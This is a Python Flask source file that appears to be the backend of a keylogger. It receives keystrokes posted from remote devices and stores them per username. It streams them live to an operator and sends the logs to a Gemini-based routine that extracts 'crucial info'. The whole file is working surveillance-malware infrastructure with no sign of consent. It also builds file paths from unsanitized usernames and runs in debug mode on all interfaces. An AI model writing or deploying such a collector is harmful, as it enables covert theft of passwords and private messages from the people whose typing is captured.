from flask import Flask, request, jsonify, render_template, Response
import time
import os
import google.generativeai as genai
from ai_analysis import analyze_keystrokes
from dotenv import load_dotenv

load_dotenv()

GOOGLE_API_KEY = os.getenv("GOOGLE_API_KEY")
if GOOGLE_API_KEY:
    genai.configure(api_key=GOOGLE_API_KEY)

LOGS_DIR = os.getenv("LOGS_DIR", "user_logs")
if not os.path.exists(LOGS_DIR):
    os.makedirs(LOGS_DIR)

app = Flask(__name__)

logged_keys = {}
live_keys = {}

def get_user_log_file(username: str) -> str:
    return os.path.join(LOGS_DIR, f"{username}_keylog.txt")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    device_info = data["device_info"]
    key_data = data["key_data"]

    username = device_info['username']
    user_log_file = get_user_log_file(username)

    with open(user_log_file, "a") as f:
        if key_data == "<enter>":
            f.write("\n")
        else:
            f.write(key_data)

    if username not in logged_keys:
        logged_keys[username] = []
    if username not in live_keys:
        live_keys[username] = []

    logged_keys[username].append(key_data)
    live_keys[username].append(key_data)

    return jsonify(status="success", message="Keystroke logged successfully")

@app.route('/logs/<user>', methods=['GET'])
def get_logs(user):
    user_log_file = get_user_log_file(user)
    try:
        with open(user_log_file, "r") as f:
            logs = f.readlines()
    except FileNotFoundError:
        logs = []

    return jsonify(status="success", logs=logs)

@app.route('/users', methods=['GET'])
def get_users():
    return jsonify(status="success", users=list(logged_keys.keys()))

@app.route('/clear_logs/<user>', methods=['DELETE'])
def clear_logs(user):
    user_log_file = get_user_log_file(user)
    try:
        os.remove(user_log_file)
        logged_keys.pop(user, None)
        live_keys.pop(user, None)
        return jsonify(status="success", message=f"Logs cleared for {user}")
    except Exception as e:
        return jsonify(status="error", message=str(e))

@app.route('/log_status', methods=['GET'])
def log_status():
    return jsonify(status="running")

@app.route('/view_logs/<user>')
def view_logs(user):
    logs = {}
    user_logs_file = get_user_log_file(user)

    if os.path.exists(user_logs_file):
        try:
            with open(user_logs_file, 'r') as file:
                logs_content = file.readlines()
                logs[user] = logs_content
        except Exception as e:
            print(f"Error reading log file for {user}: {e}")
            logs = {}
    else:
        print(f"Log file not found for {user}")
        logs = {}

    return render_template('view_logs.html', user=user, logs=logs)

@app.route('/live_logs/<user>')
def live_logs(user):
    return render_template('live_logs.html', user=user)

@app.route('/live_logs_stream/<user>')
def live_logs_stream(user):
    def generate():
        while True:
            if user in live_keys:
                while live_keys[user]:
                    key = live_keys[user].pop(0)
                    yield f"data: {key}\n\n"
            time.sleep(0.1)
    return Response(generate(), mimetype="text/event-stream")

@app.route('/analyze/<user>', methods=['GET'])
def analyze(user):
    user_log_file = get_user_log_file(user)
    try:
        with open(user_log_file, "r") as f:
            logs = f.read()
    except FileNotFoundError:
        logs = ""

    crucial_info = analyze_keystrokes(logs)
    return jsonify(status="success", crucial_info=crucial_info)

if __name__ == "__main__":
    port = int(os.getenv("FLASK_PORT", 8080))
    app.run(host='0.0.0.0', port=port, debug=True)
